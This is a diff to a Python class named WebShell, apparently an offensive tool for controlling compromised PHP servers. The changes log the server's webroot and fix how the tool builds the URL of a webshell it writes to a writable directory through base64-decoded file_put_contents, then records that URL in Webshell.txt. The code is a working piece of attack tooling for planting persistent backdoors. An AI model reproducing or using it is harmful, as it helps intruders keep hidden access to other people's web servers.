@@ -99,6 +99,8 @@ class WebShell():
         Log.success("PHP version : \n\t%s" % (self.php_version))
         Log.success("Kernel version : \n\t%s" % (self.kernel_version))
         Log.success("=" * 32)
+        Log.success("WebRoot : %s" % (self.webroot))
+        Log.success("=" * 32)
 
     def read_file(self, filepath):
         Log.info("Reading file : [%s] ..." % (filepath))
@@ -609,8 +611,10 @@ class WebShell():
                 Log.info("Writing [%s] into : [%s]" % (repr(webshell_content), writable_dir))
                 php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), webshell_content.encode("base64").replace("\n",""))
                 self.php_code_exec(php_code)
-                base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
-                webshell_url = "%s/%s" % (base_url, filename)
+                base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s" % (self.webroot), ""))
+                print "baseurl : %s" % (base_url)
+                webshell_url = "%s%s" % (base_url, filename)
+                print "webshell_url : %s" % (webshell_url)
                 with open("Webshell.txt", "a+") as f:
                     log_content = "%s => %s\n" % (webshell_url, repr(webshell_content))
                     f.write(log_content)
